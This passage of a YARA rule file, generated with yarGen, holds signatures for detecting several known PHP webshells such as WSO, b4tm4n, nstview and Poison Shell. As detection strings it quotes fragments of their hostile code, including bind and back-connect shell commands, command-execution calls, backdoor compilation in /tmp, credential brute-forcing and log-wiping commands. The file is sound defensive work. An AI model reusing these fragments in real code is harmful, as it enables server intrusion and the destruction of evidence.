      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ed597809fdcb90dabc0a555c39353982bae3c99703b81938a6e19923d0a75692"
   strings:
      $x1 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $x2 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii
      $x3 = "$alias=\"<option value=\\\"netstat -an | grep -i listen\\\">Display open ports</option><option value=\\\"last -a -n 250 -i\\\">S" ascii
      $x4 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x5 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x6 = "echo \"<br><table border=0 cellpadding=0 cellspacing=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" bgcol" ascii
      $x7 = "$alias=\"<option value=\\\"netstat -an\\\">Display open ports</option><option value=\\\"tasklist\\\">List of processes</option><" ascii
      $x8 = "<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href=\"<?php $cwd= getcwd(); echo hlinK(\"seC=sysinfo&workingdiR=$cwd" ascii
      $x9 = "$intro=\"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\"><tr><td bgcolor=\\\"#666666" ascii
      $x10 = "250 logged in users</option><option value=\\\"which wget curl lynx w3m\\\">Downloaders</option><option value=\\\"find / -perm -2" ascii
      $x11 = "0\\\" width=\\\"253\\\"><input type=text name=target value=\\\"http://\".getenv('HTTP_HOST').\"/login.php\\\" size=35></td></tr>" ascii
      $x12 = "else echo \"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" width=\\\"434\\\"><tr><t" ascii
      $x13 = "echo \"<tr><td width=\\\"25%\\\" bgcolor=\\\"#808080\\\">${mil}PHP\\\">PHP</a> version:</td><td bgcolor=\\\"#808080\\\"><a href=" ascii
      $x14 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii
      $x15 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii
      $x16 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr><form method=\\\"POST\\\"><tr><td width=\\\"20%" ascii
      $s17 = "}else echo \"<center><form method=\\\"POST\\\" name=form>${t}HTTP Auth cracker:</td><td bgcolor=\\\"#333333\\\"><select name=met" ascii
      $s18 = "echo\"</textarea></td></tr><form method=post><tr><td bgcolor=\\\"#808080\\\"><input type=text size=91 name=cmd value=\\\"\";if (" ascii
      $s19 = "fputs($url, \"GET $file HTTP/1.0\\r\\nAccept-Encoding: text\\r\\nHost: $host\\r\\nReferer: $host\\r\\nUser-Agent: Mozilla/5.0 (c" ascii
      $s20 = "fputs($url, \"GET /$file HTTP/1.0\\r\\nAccept-Encoding: text\\r\\nHost: $host\\r\\nReferer: $host\\r\\nUser-Agent: Mozilla/5.0 (" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule webshell_php_nstview {
   meta:
      description = "webshell - file nstview.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a111977d2403dd241ef2fabe841b96535f05d004a276e12ad29462b565b8aaa8"
   strings:
      $x1 = " [<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" ascii
      $x2 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $s3 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii
      $s4 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $s5 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii
      $s6 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii
      $s7 = "if($_GET['dump_download']){" fullword ascii
      $s8 = "E $str[0] ?\\\")'>[DEL]<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$str[0]&dump_db=$str[0]&f_d=$d'" ascii
      $s9 = "DUMP]</a></a> <b><a href='$php_self?baza=1&db=$str[0]&p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</" ascii
      $s10 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><input type=submit value='Start' name=bc_c style='" ascii
      $s11 = "print \"<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&delete_db=$str[0]' onclick='return confirm(\\\"DE" ascii
      $s12 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $s13 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&" ascii
      $s14 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $s15 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&" ascii
      $s16 = "Display all process - wide output (nst) ps auxw" fullword ascii
      $s17 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1\\\">\";" ascii
      $s18 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii
      $s19 = "# description (nst) command" fullword ascii
      $s20 = "# Dump db ( $db ) Table ( $tbl )" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule NIX_REMOTE_WEB_SHELL {
   meta:
      description = "webshell - file NIX REMOTE WEB-SHELL.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6ee85fade63001a1129d3fd66223066647377a49cfeec4e92b075988fe937b2f"
   strings:
      $s1 = "  if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><a href=\\\"\".$surl.\"act=f&f=accounting.log&d=/var/cpanel/" ascii
      $s2 = "  if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><a href=\\\"\".$surl.\"act=f&f=accounting.log&d=/var/cpanel/" ascii
      $s3 = "? login:password - \".$ftp_user_name.\":\".$ftp_user_name.\"</b><br>\";" fullword ascii
      $s4 = "    if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><a href=?ac=navigation&d=/var/cpanel&e=accounting.log><u><b>cpanel lo" ascii
      $s5 = "?<u><b>$fullpath</b></u>  \".exec(\"tar -zc $fullpath -f $charsname.tar.gz\").\"" fullword ascii
      $s6 = "    if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><a href=?ac=navigation&d=/var/cpanel&e=accounting.log><u><b>cpanel lo" ascii
      $s7 = "       fputs($f,\"Enter on ftp:\\nFTPhosting:\\t$host\\nLogin:\\t$login\\nPassword:\\t$password\\n \");" fullword ascii
      $s8 = "/* command execute form */" fullword ascii
      $s9 = "/* command execute */" fullword ascii
      $s10 = "document.command.cmd.value = str;" fullword ascii
      $s11 = "document.command.cmd.focus();" fullword ascii
      $s12 = "if($file && $host && $login){" fullword ascii
      $s13 = " $blah=exec(\"gcc -o /tmp/bd /tmp/bd.c\");" fullword ascii
      $s14 = "echo $ftp_user_name.\" - error<br>\";" fullword ascii
      $s15 = " $blah=exec(\"gcc -o /tmp/backc /tmp/back.c\");" fullword ascii
      $s16 = "  if (file_get_contents(\"/etc/userdomains\")) {echo \"<b><a href=\\\"\".$surl.\"act=f&f=userdomains&d=/etc/&ft=txt\\\"><u><b>Vi" ascii
      $s17 = "if ((!$_POST['dir']) OR ($_POST['dir']==\"\")) { echo \"<input type=text name=dir size=85 value=\".exec(\"pwd\").\">\"; }" fullword ascii
      $s18 = "mail(\"$qwerty\",\"NRWS LAME INFO ($host_l)\",\"NRWS STATISTIC REPORT:\\r\\n $gg\",\"From: report@nrws.net\");" fullword ascii
      $s19 = "if ((!$_POST['dir']) OR ($_POST['dir']==\"\")) { echo \"<input type=hidden name=dir size=85 value=\".exec(\"pwd\").\">\"; }" fullword ascii
      $s20 = "echo \"<b>OC:</b> \".exec(\"uname -a\").\"(\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule webshell_php_Crystal {
   meta:
      description = "webshell - file Crystal.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8cbde0e322651be9d980fe33ddee4844beabc7ded6fbc270d92a3772cd25f284"
   strings:
      $s1 = "<font face=Verdana size=-2><a href=\"?act=command\">Executed command</a></font><b> ::</b></p></td></tr><tr><td width=\"50%\" hei" ascii
      $s2 = "<font face=Verdana size=-2><a href=\"?act=command\">Executed command</a></font><b> ::</b></p></td></tr><tr><td width=\"50%\" hei" ascii
      $s3 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value=\"1\">&nbsp;<input type=\"submit\" name=\"submi" ascii
      $s4 = "print \"<center><div id=logostrip>Download - OK. (\".$sizef.\"??)</div></center>\";" fullword ascii
      $s5 = "print \"<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>\";" fullword ascii
      $s6 = "t face=\"verdana\" color=\"white\"><a title=\"bind shell\" href=\"?act=bindport\"><font color=#CC0000 size=\"3\">Bind</font></a>" ascii
      $s7 = " <br>Bind port to  :<br> bind shell " fullword ascii
      $s8 = "<font color=#DCE7EF face=\"Verdana\" size=\"-2\"><span lang=\"en-us\">&nbsp;</span></font></font></b></font><b><span lang=\"en-u" ascii
      $s9 = "\"Execute\" style=\"border: 1px solid #000000\"></form></td></tr></TABLE><a bookmark=\"minipanel\" href=\"?act=bind\"><font face" ascii
      $s10 = "function execute($com)" fullword ascii
      $s11 = ". ini_get('safe_mode_include_dir') . \"<br>Exec here: \" . ini_get('safe_mode_exec_dir'). \"</b></font>\";}" fullword ascii
      $s12 = "echo decode(execute($cmd));" fullword ascii
      $s13 = "<table id=tb><tr><td>Execute:<INPUT type=\\\"text\\\" name=\\\"cmd\\\" size=30 value=\\\"$cmd\\\"></td></tr></table>" fullword ascii
      $s14 = "echo \"<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>\";" fullword ascii
      $s15 = "echo \"<center><div id=logostrip>Edit file: $ef </div><form action=\\\"$REQUEST_URI\\\" method=\\\"POST\\\"><textarea name=conte" ascii
      $s16 = "echo \"<center><div id=logostrip>Edit file: $ef </div><form action=\\\"$REQUEST_URI\\\" method=\\\"POST\\\"><textarea name=conte" ascii
      $s17 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"][\"name\"]);" fullword ascii
      $s18 = "list file attributes on a Linux second extended file system</option><option value=\"netstat -an | grep -i listen\">" fullword ascii
      $s19 = "                    <!-- DESCRIPTION -->" fullword ascii
      $s20 = "var_dump(curl_exec($ch));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule bat_b4tm4n {
   meta:
      description = "webshell - file bat_b4tm4n.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "591efefbc046698998c618234d7ff702b65a9ef7e12cd74980558fb9d0350e98"
   strings:
      $x1 = " * [Usage] http://website.com/shell.php?x=self-encryptor&name=shell_encrypt.php" fullword ascii
      $x2 = "]?[\\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1])" ascii
      $s3 = "$kill=Execute(\"taskkill /f /pid $pid\");" fullword ascii
      $s4 = "$kill=Execute(\"taskkill /f /im $name\");" fullword ascii
      $s5 = "$ret=iconv($charset,'UTF-8',Execute($command));" fullword ascii
      $s6 = "<input type='submit' onclick=\\\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('u" ascii
      $s7 = "<input type='submit' onclick=\\\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('u" ascii
      $s8 = "<label>Target</label><input type=\"text\" id=\"target\" value=\"http://www.target.com\"><br>" fullword ascii
      $s9 = "// THIS IS FUCKING LOCAL DAMN LOG N00B! (https://github.com/k4mpr3t/b4tm4n/issues/5)" fullword ascii
      $s10 = "$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';" fullword ascii
      $s11 = "        fwrite($sock,Execute($command));" fullword ascii
      $s12 = "'fputs','ftp_connect','ftp_exec','ftp_get','ftp_login','ftp_nb_fput','ftp_put','ftp_raw','ftp_rawlist','geoip_open'," fullword ascii
      $s13 = "       fwrite($sock,Execute($command));" fullword ascii
      $s14 = "remote_addr,Execute('whoami') " fullword ascii
      $s15 = "printf(\"<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New T" ascii
      $s16 = "printf(\"<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New T" ascii
      $s17 = "<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' valu" ascii
      $s18 = "<label>Cc</label><input type='text' id='email-cc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
      $s19 = "<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' valu" ascii
      $s20 = "<label>Bcc</label><input type='text' id='email-bcc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_bat_2_7 {
   meta:
      description = "webshell - file bat_2.7.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d0197a3e0134bd5ef63d5a2b7699f6aa8403c94251ff33c88c9d1c2c83c0e335"
   strings:
      $x1 = " * [Usage] http://website.com/shell.php?x=self-encryptor&name=shell_encrypt.php" fullword ascii
      $x2 = "]?[\\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1])" ascii
      $s3 = "$kill=Execute(\"taskkill /f /pid $pid\");" fullword ascii
      $s4 = "$kill=Execute(\"taskkill /f /im $name\");" fullword ascii
      $s5 = "$ret=iconv($charset,'UTF-8',Execute($command));" fullword ascii
      $s6 = "<input type='submit' onclick=\\\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('u" ascii
      $s7 = "<input type='submit' onclick=\\\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('u" ascii
      $s8 = "<label>Target</label><input type=\"text\" id=\"target\" value=\"http://www.target.com\"><br>" fullword ascii
      $s9 = "// THIS IS FUCKING LOCAL DAMN LOG N00B! (https://github.com/k4mpr3t/b4tm4n/issues/5)" fullword ascii
      $s10 = "$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';" fullword ascii
      $s11 = "        fwrite($sock,Execute($command));" fullword ascii
      $s12 = "'fputs','ftp_connect','ftp_exec','ftp_get','ftp_login','ftp_nb_fput','ftp_put','ftp_raw','ftp_rawlist','geoip_open'," fullword ascii
      $s13 = "       fwrite($sock,Execute($command));" fullword ascii
      $s14 = "remote_addr,Execute('whoami') " fullword ascii
      $s15 = "printf(\"<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New T" ascii
      $s16 = "printf(\"<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New T" ascii
      $s17 = "<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' valu" ascii
      $s18 = "<label>Cc</label><input type='text' id='email-cc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
      $s19 = "<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' valu" ascii
      $s20 = "<label>Bcc</label><input type='text' id='email-bcc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_asw {
   meta:
      description = "webshell - file asw.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "88f4bed46b4e8ba8237edb2374a1bef7a252a01a54836ead82b5c7e989c12411"
   strings:
      $x1 = " * [Usage] http://website.com/shell.php?x=self-encryptor&name=shell_encrypt.php" fullword ascii
      $x2 = "]?[\\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1])" ascii
      $s3 = "$kill=Execute(\"taskkill /f /pid $pid\");" fullword ascii
      $s4 = "$kill=Execute(\"taskkill /f /im $name\");" fullword ascii
      $s5 = "$ret=iconv($charset,'UTF-8',Execute($command));" fullword ascii
      $s6 = "<input type='submit' onclick=\\\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('u" ascii
      $s7 = "<input type='submit' onclick=\\\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('u" ascii
      $s8 = "<label>Target</label><input type=\"text\" id=\"target\" value=\"http://www.target.com\"><br>" fullword ascii
      $s9 = "// THIS IS FUCKING LOCAL DAMN LOG N00B! (https://github.com/k4mpr3t/b4tm4n/issues/5)" fullword ascii
      $s10 = "$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';" fullword ascii
      $s11 = "        fwrite($sock,Execute($command));" fullword ascii
      $s12 = "'fputs','ftp_connect','ftp_exec','ftp_get','ftp_login','ftp_nb_fput','ftp_put','ftp_raw','ftp_rawlist','geoip_open'," fullword ascii
      $s13 = "       fwrite($sock,Execute($command));" fullword ascii
      $s14 = "remote_addr,Execute('whoami') " fullword ascii
      $s15 = "printf(\"<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New T" ascii
      $s16 = "printf(\"<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New T" ascii
      $s17 = " * L0N3W0RM SH3LL is a Recoded PHP WEBSHELL By L0N3W0RM" fullword ascii
      $s18 = "<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' valu" ascii
      $s19 = "<label>Cc</label><input type='text' id='email-cc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
      $s20 = "<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' valu" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_bat {
   meta:
      description = "webshell - file bat.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "23169d2107567f31b9cde9d04b8a9aeee99c34dc3261c81fd7a897a603ec4606"
   strings:
      $x1 = " * [Usage] http://website.com/shell.php?x=self-encryptor&name=shell_encrypt.php" fullword ascii
      $x2 = "]?[\\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1])" ascii
      $s3 = "$kill=Execute(\"taskkill /f /pid $pid\");" fullword ascii
      $s4 = "$kill=Execute(\"taskkill /f /im $name\");" fullword ascii
      $s5 = "$ret=iconv($charset,'UTF-8',Execute($command));" fullword ascii
      $s6 = "<input type='submit' onclick=\\\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('u" ascii
      $s7 = "<input type='submit' onclick=\\\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('u" ascii
      $s8 = "<label>Target</label><input type=\"text\" id=\"target\" value=\"http://www.target.com\"><br>" fullword ascii
      $s9 = "$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';" fullword ascii
      $s10 = "        fwrite($sock,Execute($command));" fullword ascii
      $s11 = "'fputs','ftp_connect','ftp_exec','ftp_get','ftp_login','ftp_nb_fput','ftp_put','ftp_raw','ftp_rawlist','geoip_open'," fullword ascii
      $s12 = "       fwrite($sock,Execute($command));" fullword ascii
      $s13 = "remote_addr,Execute('whoami') " fullword ascii
      $s14 = "printf(\"<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New T" ascii
      $s15 = "printf(\"<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New T" ascii
      $s16 = "<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' valu" ascii
      $s17 = "<label>Cc</label><input type='text' id='email-cc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
      $s18 = "<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' valu" ascii
      $s19 = "<label>Bcc</label><input type='text' id='email-bcc' placeholder='target1@target.com,target2@target.com' value=''/><br>" fullword ascii
      $s20 = " * Self Script Encryptor v1.0" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule WSO_4_0_5 {
   meta:
      description = "webshell - file WSO_4_0_5.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
   strings:
      $x1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" target=\"_b" ascii
      $s2 = " '<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" target=\"_b" ascii
      $s3 = "$millink='http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s4 = "showSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s5 = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?" ascii
      $s6 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii
      $s7 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s8 = "echo \"<br><textarea name='p3' style='width:100%;height:100px'>\".@htmlspecialchars($_POST['p3']).\"</textarea><br/><input type=" ascii
      $s9 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=''\";" fullword ascii
      $s10 = " Unable to execute command\\n\";" fullword ascii
      $s11 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,null,this." ascii
      $s12 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,null,this." ascii
      $s13 = "pe=submit value=\">>\"></form><br><span>Posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",t" ascii
      $s14 = "header(\"Content-Disposition: attachment; filename=dump.sql\");" fullword ascii
      $s15 = "echo @file_get_contents($temp);" fullword ascii
      $s16 = "function bruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s17 = "die(\"<pre align=center><form method=post style='font-family:fantasy;'>Password: <input type=password name=pass style='backgroun" ascii
      $s18 = "k\">[Google]</a> <a href=\"'.$millink.'\" target=_blank>[Exploit-DB]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '." ascii
      $s19 = "die(\"<pre align=center><form method=post style='font-family:fantasy;'>Password: <input type=password name=pass style='backgroun" ascii
      $s20 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_poison {
   meta:
      description = "webshell - file poison.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "950c0bc99365a43e13795a63f24100d5dcc0549245f31a3a68f58e8cc41c1906"
   strings:
      $x1 = "nd / -name log* -exec rm -rf {} \\;', 'find / -name  *.log -exec rm -rf {} \\;', 'unset HISTFILE', 'unset SAVEHIST');" fullword ascii
      $s2 = "        $comandos = array('find / -name *.bash_history -exec rm -rf {} \\;', 'find / -name *.bash_logout -exec rm -rf {} \\;', '" ascii
      $s3 = "    $link = \"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=\" . $verdad . \"&filter_exploit_" ascii
      $s4 = "        $paths = array(\"/var/log/lastlog\", \"/var/log/telnetd\", \"/var/run/utmp\", \"/var/log/secure\", \"/root/.ksh_history" ascii
      $s5 = "<td>Target : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=idiot value=target@hotmail.com size=44><tr>" fullword ascii
      $s6 = "Blog : doddy-hackman.blogspot.com" fullword ascii
      $s7 = "        system(\"cmd.exe\");" fullword ascii
      $s8 = "var/spool/logs\", \"/var/spool/locks\", \"/usr/local/www/logs/thttpd_log\", \"/var/log/thttpd_log\", \"/var/log/ncftpd/misclog.t" ascii
      $s9 = "    $link = \"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=\" . $verdad . \"&filter_exploit_" ascii
      $s10 = "Poison Shell 1.0" fullword ascii
      $s11 = "var/log/samba\", \"/var/log/samba.log.%m\", \"/var/lock/samba\", \"/root/.Xauthority\", \"/var/log/poplog\", \"/var/log/news.all" ascii
      $s12 = "    echo \"<title>\" . $_SERVER[\"SERVER_NAME\"] . \" - PoisonShell</title>\";" fullword ascii
      $s13 = "=$valor&host=\" . $_GET['host'] . \"&usuario=\" . $_GET['usuario'] . \"&password=\" . $_GET['password'] . \"&bajardb=\" . $valor" ascii
      $s14 = "print \"\\n== -- Reverse Shell 0.2 - Doddy H 2012 -- ==\\n\\n\";" fullword ascii
      $s15 = "        $tod = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']) or die(\"<h1>Error</h1>\");" fullword ascii
      $s16 = "        $conexion = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']) or die(\"<h1>Error</h1>\");" fullword ascii
      $s17 = "                echo \"<td class=main>$valor</td><td class=main><a href=?datear=$valor&host=\" . $_GET['host'] . \"&usuario=\" ." ascii
      $s18 = "                        echo \"<td class=main>$valor</td><td class=main><a href=?datear=$valor&host=\" . $_GET['host'] . \"&usua" ascii
      $s19 = "<td>FakeMail : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=falso value=lagarto@juancho.com size=44><tr>" fullword ascii
      $s20 = "        $comandos = array('find / -name *.bash_history -exec rm -rf {} \\;', 'find / -name *.bash_logout -exec rm -rf {} \\;', '" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_xw {
   meta:
      description = "webshell - file xw.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "642e4d646573c2cf95a71034e6a44e3b66628db6ff9042c963d86c777ac1d247"
   strings:
      $s1 = "echo $out =  (\"system\"==$seletefunc)?system($shellcmd):(($seletefunc==\"exec\")?exec($shellcmd):(($seletefunc==\"shell_exec\")" ascii
      $s2 = "<form method=\"post\" action=\"?action=login\" enctype=\"multipart/form-data\">" fullword ascii
      $s3 = "IP:\",gethostbyname($_SERVER[\"SERVER_NAME\"]));" fullword ascii
      $s4 = "_exec($shellcmd):(($seletefunc==\"passthru\")?passthru($shellcmd):system($shellcmd))));" fullword ascii
      $s5 = "}else getloginpass();" fullword ascii
      $s6 = "function getloginpass(){" fullword ascii
      $s7 = "if($_GET[\"action\"] == \"login\"){" fullword ascii
      $s8 = "getloginpass();" fullword ascii
      $s9 = "\";if(is_dir($dir)) {if ($fp = @fopen(\"$dir/temp.tmp\", 'w')) {@fclose($fp);@unlink(\"$dir/temp.tmp\");$write = \"" fullword ascii
      $s10 = "if($my_password==$_POST[\"pmy_password\"]){" fullword ascii
      $s11 = "echo $out =  (\"system\"==$seletefunc)?system($shellcmd):(($seletefunc==\"exec\")?exec($shellcmd):(($seletefunc==\"shell_exec\")" ascii
      $s12 = "(<a href=\\\"http://www.s8s8.net\\\">http://www.s8s8.net</a>) ZV(<a href=\\\"mailto:zvrop@163.com\\\">zvrop@163.com</a>)</b> " fullword ascii
